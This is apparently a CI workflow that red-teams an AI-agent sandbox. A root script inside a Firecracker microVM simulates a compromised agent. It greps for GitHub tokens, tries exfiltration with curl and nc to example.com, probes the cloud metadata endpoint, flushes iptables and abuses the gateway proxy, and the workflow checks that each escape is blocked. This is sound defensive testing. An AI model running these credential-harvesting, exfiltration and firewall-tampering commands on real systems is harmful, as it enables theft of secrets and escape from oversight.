name: "Agent sandbox — Phase 5: in-guest-root red team"

# Phase 5 of ACTIONS-AGENT-STEP-PROTOTYPE (prototypes github/c2c-actions#10310).
# Simulates a fully compromised agent: a script runs as root (PID 1) inside the
# microVM and actively tries to escape the sandbox. Each defense must hold.
# (Severing set-env/add-path workflow commands is out of scope here — it needs
# runner changes for the agent step, not something enforceable from inside the VM.)

on:
  workflow_dispatch:
  push:
    paths:
      - .github/workflows/agent-sandbox-phase5-redteam.yml

permissions:
  contents: read

jobs:
  redteam-microvm:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    env:
      FAKE_TOKEN: ghs_FAKE00000000000000000000000000000000
      GH_TOKEN: ${{ github.token }}
    steps:
      - name: Install host tools + mitmproxy
        run: |
          set -eux
          sudo apt-get update -qq
          sudo apt-get install -y -qq e2fsprogs iproute2 iptables jq
          pipx install mitmproxy
          echo "$HOME/.local/bin" >> "$GITHUB_PATH"

      - name: Generate gateway CA
        run: |
          set -eux
          export PATH="$HOME/.local/bin:$PATH"
          timeout 8 mitmdump -q >/dev/null 2>&1 || true
          cp "$HOME/.mitmproxy/mitmproxy-ca-cert.pem" mitmproxy-ca.pem

      - name: Write gateway addon (allowlist + token swap)
        run: |
          cat > gw_addon.py <<'GWADDON'
          import os
          from mitmproxy import http

          FAKE = os.environ.get("FAKE_TOKEN", "")
          REAL = os.environ.get("REAL_TOKEN", "")
          ALLOW = {"api.github.com", "api.githubcopilot.com", "api.mcp.github.com"}


          def _append(path, line):
              with open(path, "a") as f:
                  f.write(line + "\n")


          def request(flow: http.HTTPFlow) -> None:
              host = flow.request.pretty_host
              _append("/tmp/gw-hosts.log", host)
              if host not in ALLOW:
                  _append("/tmp/gw-blocked.log", host + " " + flow.request.path)
                  flow.response = http.Response.make(403, b"blocked\n", {"Content-Type": "text/plain"})
                  return
              if FAKE:
                  for k in list(flow.request.headers.keys()):
                      val = flow.request.headers[k]
                      if FAKE in val:
                          flow.request.headers[k] = val.replace(FAKE, REAL)
          GWADDON
          echo "wrote gw_addon.py"

      - name: Build guest rootfs (fake token + CA + red-team script) -> ext4
        run: |
          set -eux
          mkdir -p guest

          cat > guest/Dockerfile <<'DOCKER'
          FROM debian:bookworm-slim
          RUN apt-get update && apt-get install -y --no-install-recommends \
                ca-certificates curl iproute2 iptables procps netcat-openbsd \
              && rm -rf /var/lib/apt/lists/*
          RUN mknod -m 622 /dev/console c 5 1 || true; \
              mknod -m 666 /dev/null c 1 3 || true; \
              mknod -m 666 /dev/zero c 1 5 || true; \
              mknod -m 444 /dev/urandom c 1 9 || true; \
              mknod -m 620 /dev/ttyS0 c 4 64 || true
          COPY init.sh /init
          COPY redteam.sh /redteam.sh
          RUN chmod +x /init /redteam.sh
          DOCKER

          cat > guest/init.sh <<'INIT'
          #!/bin/bash
          set -x
          mount -t proc proc /proc 2>/dev/null || true
          mount -t sysfs sys /sys 2>/dev/null || true
          mount -t devtmpfs dev /dev 2>/dev/null || true
          ip link set lo up
          ip addr add 172.16.0.2/30 dev eth0
          ip link set eth0 up
          ip route add default via 172.16.0.1
          echo 'nameserver 8.8.8.8' > /etc/resolv.conf
          update-ca-certificates 2>/dev/null || true
          [ -f /etc/agent.env ] && . /etc/agent.env
          /redteam.sh 2>&1 | tee /dev/console
          sync
          echo 1 > /proc/sys/kernel/sysrq
          echo b > /proc/sysrq-trigger
          sleep infinity
          INIT

          cat > guest/redteam.sh <<'REDTEAM'
          #!/bin/bash
          set -x
          echo "=== RED TEAM: root in guest attempting to escape ==="

          # 1) Steal real credentials — only the fake sentinel should exist anywhere.
          REAL=$(grep -rIhoE 'ghs_[A-Za-z0-9]{30,}' / 2>/dev/null | grep -vE 'ghs_FAKE0+' | sort -u | head)
          ENVREAL=$(env | grep -oE 'ghs_[A-Za-z0-9]{30,}' | grep -vE 'ghs_FAKE0+' | head)
          echo "leaked-real-cred-candidates: [${REAL}][${ENVREAL}]"
          if [ -z "${REAL}${ENVREAL}" ]; then echo "RT_NO_REAL_CREDS=yes"; else echo "RT_NO_REAL_CREDS=no"; fi

          # 2) Exfiltrate to non-allowlisted destinations (all must be blocked, i.e. never 200).
          c_https=$(curl -sS -o /dev/null -w '%{http_code}' -m 12 https://example.com)
          c_http=$(curl -sS -o /dev/null -w '%{http_code}' -m 8 http://example.com)
          c_altport=$(curl -sS -o /dev/null -w '%{http_code}' -m 8 http://93.184.216.34:8080)
          c_doh=$(curl -sS -o /dev/null -w '%{http_code}' -m 12 https://1.1.1.1/dns-query)
          nc_raw=$(printf 'x' | nc -w 5 example.com 4444 >/dev/null 2>&1 && echo OPEN || echo BLOCKED)
          echo "exfil: https=${c_https} http=${c_http} altport=${c_altport} doh=${c_doh} nc=${nc_raw}"
          if [ "${c_https}" != "200" ] && [ "${c_http}" = "000" ] && [ "${c_altport}" = "000" ] \
             && [ "${c_doh}" != "200" ] && [ "${nc_raw}" = "BLOCKED" ]; then
            echo "RT_EXFIL_BLOCKED=yes"; else echo "RT_EXFIL_BLOCKED=no"; fi

          # 3) Cloud/runner metadata endpoint must be unreachable.
          c_meta=$(curl -sS -o /dev/null -w '%{http_code}' -m 8 http://169.254.169.254/latest/meta-data/)
          echo "metadata: ${c_meta}"
          [ "${c_meta}" = "000" ] && echo "RT_METADATA_BLOCKED=yes" || echo "RT_METADATA_BLOCKED=no"

          # 4) Tamper: disable in-guest filtering + reroute, then retry exfil.
          iptables -F 2>/dev/null || true
          iptables -P INPUT ACCEPT 2>/dev/null || true
          iptables -P OUTPUT ACCEPT 2>/dev/null || true
          iptables -P FORWARD ACCEPT 2>/dev/null || true
          sysctl -w net.ipv4.ip_forward=1 2>/dev/null || true
          ip route replace default via 172.16.0.1 2>/dev/null || true
          c_after=$(curl -sS -o /dev/null -w '%{http_code}' -m 8 http://example.com)
          echo "after-tamper http://example.com: ${c_after}"
          [ "${c_after}" = "000" ] && echo "RT_TAMPER_BLOCKED=yes" || echo "RT_TAMPER_BLOCKED=no"

          # 5) Abuse the host gateway as an open forward proxy.
          c_proxy=$(curl -sS -o /dev/null -w '%{http_code}' -x http://172.16.0.1:8080 -m 12 https://example.com 2>/dev/null || echo 000)
          echo "gateway-as-open-proxy example.com: ${c_proxy}"
          [ "${c_proxy}" != "200" ] && echo "RT_GATEWAY_NO_OPEN_PROXY=yes" || echo "RT_GATEWAY_NO_OPEN_PROXY=no"

          echo "=== RED TEAM: done ==="
          REDTEAM

          docker build -t redteam-rootfs guest
          cid=$(docker create redteam-rootfs)
          docker export "$cid" -o rootfs.tar
          docker rm "$cid"
          truncate -s 2G rootfs.ext4
          mkfs.ext4 -q -F rootfs.ext4
          mkdir -p mnt
          sudo mount -o loop rootfs.ext4 mnt
          sudo tar -C mnt -xf rootfs.tar
          # Guest holds only the FAKE sentinel token (never the real one).
          printf 'export COPILOT_GITHUB_TOKEN=%s\n' "${FAKE_TOKEN}" | sudo tee mnt/etc/agent.env >/dev/null
          sudo mkdir -p mnt/usr/local/share/ca-certificates
          sudo cp mitmproxy-ca.pem mnt/usr/local/share/ca-certificates/mitmproxy.crt
          sudo umount mnt

      - name: Download Firecracker + guest kernel
        run: |
          set -eux
          ARCH="$(uname -m)"
          S3="https://s3.amazonaws.com/spec.ccfc.min"
          CI_PREFIX=$(curl -fsSL "$S3?list-type=2&prefix=firecracker-ci/&delimiter=/" \
            | grep -oP "(?<=<Prefix>)firecracker-ci/[0-9]{8}-[^/]+/(?=</Prefix>)" | sort | tail -1)
          KERNEL_KEY=$(curl -fsSL "$S3?list-type=2&prefix=${CI_PREFIX}${ARCH}/vmlinux-" \
            | grep -oP "(?<=<Key>)(${CI_PREFIX}${ARCH}/vmlinux-[0-9]+\.[0-9]+\.[0-9]{1,3})(?=</Key>)" \
            | sort -V | tail -1)
          wget -q "$S3/${KERNEL_KEY}" -O vmlinux
          REL="https://github.com/firecracker-microvm/firecracker/releases"
          LATEST=$(basename "$(curl -fsSLI -o /dev/null -w '%{url_effective}' ${REL}/latest)")
          curl -sSL "${REL}/download/${LATEST}/firecracker-${LATEST}-${ARCH}.tgz" | tar -xz
          mv "release-${LATEST}-${ARCH}/firecracker-${LATEST}-${ARCH}" firecracker
          chmod +x firecracker

      - name: Boot with firewall + gateway, run the red team
        run: |
          set -x
          export PATH="$HOME/.local/bin:$PATH"
          sudo setfacl -m u:"${USER}":rw /dev/kvm 2>/dev/null || sudo chmod 666 /dev/kvm || true

          sudo ip link del tap0 2>/dev/null || true
          sudo ip tuntap add dev tap0 mode tap
          sudo ip addr add 172.16.0.1/30 dev tap0
          sudo ip link set tap0 up
          sudo sysctl -w net.ipv4.ip_forward=1
          sudo sysctl -w net.ipv4.conf.all.send_redirects=0
          HOST_IFACE=$(ip -j route list default | jq -r '.[0].dev')

          sudo iptables -I FORWARD 1 -i "$HOST_IFACE" -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT
          sudo iptables -I FORWARD 2 -i tap0 -p udp --dport 53 -j ACCEPT
          sudo iptables -I FORWARD 3 -i tap0 -p tcp --dport 53 -j ACCEPT
          sudo iptables -I FORWARD 4 -i tap0 -j DROP
          sudo iptables -t nat -A POSTROUTING -o "$HOST_IFACE" -j MASQUERADE
          sudo iptables -t nat -A PREROUTING -i tap0 -p tcp --dport 443 -j REDIRECT --to-ports 8080

          set +x
          REAL_TOKEN="$GH_TOKEN" FAKE_TOKEN="$FAKE_TOKEN" mitmdump --mode transparent \
            --listen-host 0.0.0.0 --listen-port 8080 -s gw_addon.py -q --set block_global=false \
            > gateway.log 2>&1 &
          GW_PID=$!
          set -x
          for i in $(seq 1 40); do ss -ltn 2>/dev/null | grep -q ':8080' && break; sleep 0.5; done

          cat > vm_config.json <<'EOF'
          {
            "boot-source": { "kernel_image_path": "vmlinux", "boot_args": "console=ttyS0 reboot=k panic=1 init=/init" },
            "drives": [ { "drive_id": "rootfs", "path_on_host": "rootfs.ext4", "is_root_device": true, "is_read_only": false } ],
            "network-interfaces": [ { "iface_id": "eth0", "host_dev_name": "tap0", "guest_mac": "06:00:AC:10:00:02" } ],
            "machine-config": { "vcpu_count": 2, "mem_size_mib": 1024 }
          }
          EOF

          rm -f /tmp/fc.sock
          echo "== booting red-team microVM (up to 180s) =="
          sudo timeout -k 5 180 ./firecracker --api-sock /tmp/fc.sock --config-file vm_config.json \
            > console.log 2>&1 || true
          kill "$GW_PID" 2>/dev/null || true

          echo "== console.log (tail) =="; tail -n 100 console.log || true

          declare -A R
          for k in RT_NO_REAL_CREDS RT_EXFIL_BLOCKED RT_METADATA_BLOCKED RT_TAMPER_BLOCKED RT_GATEWAY_NO_OPEN_PROXY; do
            if grep -q "${k}=yes" console.log; then R[$k]=yes; else R[$k]=no; fi
          done

          {
            echo "## Phase 5: in-guest-root red team"
            echo "- Could NOT steal real credentials (only fake sentinel in guest): **${R[RT_NO_REAL_CREDS]}**"
            echo "- Could NOT exfiltrate off-allowlist (443/80/alt-port/DoH/raw all blocked): **${R[RT_EXFIL_BLOCKED]}**"
            echo "- Could NOT reach cloud/runner metadata: **${R[RT_METADATA_BLOCKED]}**"
            echo "- Could NOT bypass firewall by tampering in-guest: **${R[RT_TAMPER_BLOCKED]}**"
            echo "- Could NOT abuse the host gateway as an open proxy: **${R[RT_GATEWAY_NO_OPEN_PROXY]}**"
          } >> "$GITHUB_STEP_SUMMARY"

          if [ "${R[RT_NO_REAL_CREDS]}" = yes ] && [ "${R[RT_EXFIL_BLOCKED]}" = yes ] \
             && [ "${R[RT_METADATA_BLOCKED]}" = yes ] && [ "${R[RT_TAMPER_BLOCKED]}" = yes ] \
             && [ "${R[RT_GATEWAY_NO_OPEN_PROXY]}" = yes ]; then
            echo "✅ every red-team escape failed: no creds, no off-allowlist egress, firewall tamper-proof, gateway not an open proxy"
          else
            echo "❌ Phase 5: a red-team escape SUCCEEDED — investigate"
            for k in "${!R[@]}"; do echo "  $k=${R[$k]}"; done
            exit 1
          fi

      - name: Upload red-team artifacts
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: redteam-console
          path: |
            console.log
            gateway.log
            vm_config.json
          if-no-files-found: ignore
